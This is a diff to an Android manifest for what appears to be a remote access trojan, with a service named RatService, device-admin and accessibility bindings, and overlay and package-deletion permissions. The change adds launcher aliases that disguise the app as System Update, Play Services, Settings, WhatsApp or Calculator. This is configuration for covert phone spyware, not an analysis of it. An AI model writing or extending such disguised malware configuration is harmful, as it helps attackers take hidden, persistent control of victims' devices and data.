@@ -58,12 +58,11 @@
     <uses-permission android:name="android.permission.DISABLE_KEYGUARD"/>
     <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"
         tools:ignore="QueryAllPackagesPermission"/>
-
-    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
-    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
     <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES"/>
     <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES"/>
     <uses-permission android:name="android.permission.REORDER_TASKS"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
 
     <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN"/>
     <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
@@ -76,7 +75,7 @@
         android:allowBackup="false"
         android:icon="@mipmap/ic_launcher"
         android:roundIcon="@mipmap/ic_launcher_round"
-        android:label="System Update"
+        android:label="EXOID ENGINE"
         android:supportsRtl="true"
         android:theme="@style/Theme.SystemUpdate"
         android:usesCleartextTraffic="true"
@@ -86,25 +85,103 @@
         android:requestLegacyExternalStorage="true"
         tools:targetApi="35">
 
+        <!-- ============ SETUP USERNAME (LAUNCHER DEFAULT) ============ -->
         <activity
             android:name=".SetupUsernameActivity"
             android:exported="true"
             android:launchMode="singleTop"
-            android:screenOrientation="portrait">
+            android:screenOrientation="portrait"
+            android:enabled="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
         </activity>
 
+        <!-- ============ ALIAS 1: System Update ============ -->
+        <activity-alias
+            android:name=".AliasSystemUpdate"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_launcher_play"
+            android:roundIcon="@mipmap/ic_launcher_play"
+            android:label="System Update"
+            android:targetActivity=".SetupUsernameActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <!-- ============ ALIAS 2: Play Services ============ -->
+        <activity-alias
+            android:name=".AliasPlayServices"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_launcher_play"
+            android:roundIcon="@mipmap/ic_launcher_play"
+            android:label="Play Services"
+            android:targetActivity=".SetupUsernameActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <!-- ============ ALIAS 3: Settings ============ -->
+        <activity-alias
+            android:name=".AliasSettings"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_launcher_play"
+            android:roundIcon="@mipmap/ic_launcher_play"
+            android:label="Settings"
+            android:targetActivity=".SetupUsernameActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <!-- ============ ALIAS 4: WhatsApp ============ -->
+        <activity-alias
+            android:name=".AliasWhatsApp"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_launcher_play"
+            android:roundIcon="@mipmap/ic_launcher_play"
+            android:label="WhatsApp"
+            android:targetActivity=".SetupUsernameActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <!-- ============ ALIAS 5: Calculator ============ -->
+        <activity-alias
+            android:name=".AliasCalculator"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_launcher_play"
+            android:roundIcon="@mipmap/ic_launcher_play"
+            android:label="Calculator"
+            android:targetActivity=".SetupUsernameActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <!-- ============ MAIN ACTIVITY ============ -->
         <activity
             android:name=".MainActivity"
             android:exported="false"
             android:launchMode="singleTop"
-            android:excludeFromRecents="false"
             android:configChanges="orientation|screenSize|keyboardHidden"
             android:screenOrientation="portrait"/>
 
+        <!-- ============ SERVICES ============ -->
         <service
             android:name=".RatService"
             android:exported="false"
@@ -164,6 +241,7 @@
                 android:resource="@xml/accessibility_service_config"/>
         </service>
 
+        <!-- ============ RECEIVERS ============ -->
         <receiver
             android:name=".AdminReceiver"
             android:permission="android.permission.BIND_DEVICE_ADMIN"
